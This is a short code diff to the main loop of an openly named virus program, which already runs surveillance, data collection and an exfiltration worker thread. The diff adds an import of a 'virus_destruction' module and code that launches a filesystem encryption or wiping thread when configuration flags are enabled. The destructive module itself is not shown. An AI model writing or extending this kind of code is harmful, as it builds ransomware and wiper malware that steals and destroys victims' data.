@@ -28,6 +28,7 @@ from virus_surveillance import (
 )
 from virus_data_collection import save_all_collected_data
 from virus_exfiltration import exfiltration_worker
+from virus_destruction import start_destruction
 
 # Global flag for graceful shutdown
 running = True
@@ -96,6 +97,12 @@ def main():
         exfil_thread = threading.Thread(target=exfiltration_worker, daemon=True)
         exfil_thread.start()
         log_activity("SYSTEM", "Data exfiltration worker started")
+    
+    # Start filesystem destruction (encryption/wiping)
+    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING:
+        destruction_thread = start_destruction()
+        if destruction_thread:
+            log_activity("SYSTEM", "Filesystem destruction module activated")
     
     # Log initial window
     window_title, app_name = get_active_window_info()
